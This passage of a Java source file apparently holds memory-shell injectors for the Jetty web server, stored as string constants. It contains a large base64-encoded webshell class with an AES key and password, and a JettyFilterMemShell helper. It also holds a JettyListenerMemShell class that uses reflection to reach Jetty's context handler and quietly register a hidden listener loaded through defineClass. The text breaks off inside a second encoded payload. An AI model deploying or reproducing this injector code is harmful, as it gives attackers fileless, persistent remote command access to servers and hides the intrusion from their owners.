sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQACbzEBAAFpAQABSQEAB2NsYXNzZXMBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAR2YXI3AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBFwcBBgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBPgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAEdmFyOQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwE/BwFAAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVKZXR0eUZpbHRlclNoZWxsLmphdmEMAHMAdAwAaQBqDABrAGwBABAzYzZlMGI4YTljMTUyMjRhDABtAG4BAARwQVMzDABvAG4BABAvZmF2aWNvbmRlbW8uaWNvDABwAG4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBQQFCDAFDAUQMAHEAjgwAcQBuAQAFVVRGLTgMAHIAbgwAcwB6DAFFAUYBAANBRVMHATwMAUcBSAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUkBSgwAcwFLDADAAUwMAU0BTgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAU8MAUcBUAwBUQFSDAFTAVQBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBVQFKDABzAVYMAUMBVwwBWAFEAQAQamF2YS51dGlsLkJhc2U2NAwBWQFaAQAKZ2V0RW5jb2RlcgwBWwFcBwE9DAC1AV0MAV4BXwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFgAWEBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBYgFjAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFkAV8MAHMBZQwBZgFnDAFoAWkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAwBagFcAQATamF2YS91dGlsL0FycmF5TGlzdAwBawFsDAFtAW4MALAAsQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEFgtUmVxdWVzdGVkLVdpdGgMAW8AjgEADlhNTEhUVFBSZXF1ZXN0DAFwAXEMAXIBcwwBdACODACcAJ0MAIEAggEAEG1lbXNoZWxsLnBheWxvYWQHAT8MAXUBdgEAGW1lbXNoZWxsL0pldHR5RmlsdGVyU2hlbGwMAXcBeAwAfQB+DAF5AXoBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBewFsDAF8AX0MAX4BfwcBgAwBgQFlDAGCAUoMAJIAkwwBfgFXAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwGDDADFAYQMAYUAdAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAd0b0FycmF5AQAoKFtMamF2YS9sYW5nL09iamVjdDspW0xqYXZhL2xhbmcvT2JqZWN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGZXF1YWxzAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALdG9CeXRlQXJyYXkBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQAhAFIAZwABAGgABwABAGkAagAAAAEAawBsAAAAAABtAG4AAAABAG8AbgAAAAEAcABuAAAAAABxAG4AAAABAHIAbgAAAA4AAQBzAHQAAQB1AAAAkAADAAEAAABGKrcAASoBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAIAdgAAACYACQAAABwABAAUAAkAFQAOABYAFAAXABoAGAAgAB0APwAeAEUAHwB3AAAADAABAAAARgB4AHkAAAABAHMAegABAHUAAACbAAMAAgAAAEcqK7cAEioBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAI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\");\n" +
            "                Class var3 = (Class)var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                CLAZZ_NAME = var3.getName();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized boolean isInjected(Object var0, String var1) throws NoSuchFieldException, IllegalAccessException {\n" +
            "        Field var2 = var0.getClass().getDeclaredField(\"_filterMappings\");\n" +
            "        var2.setAccessible(true);\n" +
            "        Object var3 = var2.get(var0);\n" +
            "\n" +
            "        for(int var4 = 0; var4 < Array.getLength(var3); ++var4) {\n" +
            "            Object var5 = Array.get(var3, var4);\n" +
            "            Field var6 = var5.getClass().getDeclaredField(\"_filterName\");\n" +
            "            var6.setAccessible(true);\n" +
            "            String var7 = (String)var6.get(var5);\n" +
            "            if (var7.contains(var1)) {\n" +
            "                return true;\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return false;\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "    static {\n" +
            "        new JettyFilterMemShell();\n" +
            "    }\n" +
            "}\n" +
            "\n";

    public static final String JettyListenerMemShell =
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.EventListener;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "\n" +
            "public class JettyListenerMemShell {\n" +
            "    public static Object MEMSHELL_OBJECT;\n" +
            "    static String ListenerName = \"memshell.JettyListenerShell\";\n" +
            "\n" +
            "    public JettyListenerMemShell() {\n" +
            "        Object var1 = getContext();\n" +
            "        if (var1 != null && !isInjected(var1)) {\n" +
            "            injectMemShellClass();\n" +
            "            injectMemShell(var1);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized boolean isInjected(Object context) {\n" +
            "        try {\n" +
            "            List var2 = (List) getFV(context, \"_eventListeners\");\n" +
            "            ;\n" +
            "            Iterator var3 = var2.iterator();\n" +
            "            while (var3.hasNext()) {\n" +
            "                Object var4 = var3.next();\n" +
            "                if (var4.getClass().getName().contains(ListenerName)) {\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectMemShell(Object context) {\n" +
            "        try {\n" +
            "            Method var3 = getMethodByClass(context.getClass(), \"addEventListener\", EventListener.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            var3.invoke(context, MEMSHELL_OBJECT);\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized Object getContext() {\n" +
            "        try {\n" +
            "            Thread var1 = Thread.currentThread();\n" +
            "            Field var2 = Class.forName(\"java.lang.Thread\").getDeclaredField(\"threadLocals\");\n" +
            "            var2.setAccessible(true);\n" +
            "            Object var3 = var2.get(var1);\n" +
            "            Class var4 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
            "            Field var5 = var4.getDeclaredField(\"table\");\n" +
            "            var5.setAccessible(true);\n" +
            "            Object var6 = var5.get(var3);\n" +
            "            Class var7 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
            "            Field var8 = var7.getDeclaredField(\"value\");\n" +
            "            var8.setAccessible(true);\n" +
            "            Object var9 = null;\n" +
            "\n" +
            "            for(int var11 = 0; var11 < Array.getLength(var6); ++var11) {\n" +
            "                Object var10 = Array.get(var6, var11);\n" +
            "                if (var10 != null) {\n" +
            "                    var9 = var8.get(var10);\n" +
            "                    if (var9 != null && var9.getClass().getName().equals(\"org.eclipse.jetty.server.HttpConnection\")) {\n" +
            "                        break;\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "            Class var23 = var9.getClass();\n" +
            "            Object var12 = var23.getMethod(\"getHttpChannel\").invoke(var9);\n" +
            "            Object var13 = var12.getClass().getMethod(\"getRequest\").invoke(var12);\n" +
            "            Object var16 = var13.getClass().getMethod(\"getSession\").invoke(var13);\n" +
            "            Object var17 = var16.getClass().getMethod(\"getServletContext\").invoke(var16);\n" +
            "            Object var19 = getFV(var17, \"this$0\");\n" +
            "            Object var21 = getFV(var19, \"_servletHandler\");\n" +
            "            Object var24 = getFV(var21, \"_contextHandler\");\n" +
            "            return var24;\n" +
            "\n" +
            "        } catch (Exception var22) {\n" +
            "        }\n" +
            "\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static void injectMemShellClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBbAoAZAC+CQBGAL8JAEYAwAgAwQkARgDCCADDCQBGAMQIAMUJAEYAxgcAxwoACgC+CgAKAMgKAAoAyQoARgDKCQBGAMsIAMwJAEYAzQoAZADOCgBkAM8IANAKANEA0gcA0woAMQDUCgAWANUKANEA1goA0QDXBwDYCADZCgDaANsKADEA3AoA2gDdBwDeCgDaAN8KACAA4AoAIADhCgAxAOIIAOMKAC4A5AgA5QcA5goALgDnBwDoCgDpAOoKADAA6wgA7AcA7QcAfQcA7gcA7wgA8AoALgDxCADyCADzCAD0CAD1CAD2CgD3APgHAPkKAEYA+ggA+wsAOgD8CAD9CgAxAP4LADoA/wsAOgEACgBGAQEKAEYBAggBAwsBBAEFBwEGCgAuAQcKAEYAzgoARgEICwEEAQkIAQoLADoBCQcBCwoATQC+CgAwAQwLAGMBDQoAMQEOCgEPARAKADAAyQoATQERCgBGARIKADEBEwgBFAgBFQoAGwEWCgAuARcHARgKAC4BGQoAWwEaCgEbARwKARsBHQgBHgoARgEfCAEgBwEhBwEiBwEjAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MbWVtc2hlbGwvSmV0dHlMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcBBgcBJAcA2AEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAO8BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHASUHAPkHASEHASYBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEABHZhcjEBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMHAScHAO0HARgBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACbzEBAAJvMgEAClNvdXJjZUZpbGUBABdKZXR0eUxpc3RlbmVyU2hlbGwuamF2YQwAcABxDABmAGcMAGgAaQEAEDNjNmUwYjhhOWMxNTIyNGEMAGoAawEABHBBUzMMAGwAawEAEC9mYXZpY29uZGVtby5pY28MAG0AawEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEoASkMASoBKwwAbgCLDABuAGsBAAVVVEYtOAwAbwBrDABwAHcMASwBLQEAA0FFUwcBJAwBLgEvAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBMAExDABwATIMATMBNAwBNQE2AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBNwwBLgE4DAE5AToMATsBPAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAE9ATEMAHABPgwBKgE/DAFAASsBABBqYXZhLnV0aWwuQmFzZTY0DAFBAUIBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAFDAUQBABNbTGphdmEvbGFuZy9PYmplY3Q7BwFFDAFGAUcMAUgBSQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFKAUsBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgcBJQwBTAFNAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAuAC5AQAQWC1SZXF1ZXN0ZWQtV2l0aAwBTgCLAQAOWE1MSFRUUFJlcXVlc3QMAU8BUAwBUQFSDAFTAIsMAJkAmgwAfgB/AQAQbWVtc2hlbGwucGF5bG9hZAcBJgwBVAFVAQAbbWVtc2hlbGwvSmV0dHlMaXN0ZW5lclNoZWxsDAFWAVcMAHoAewwBWAFZAQAKcG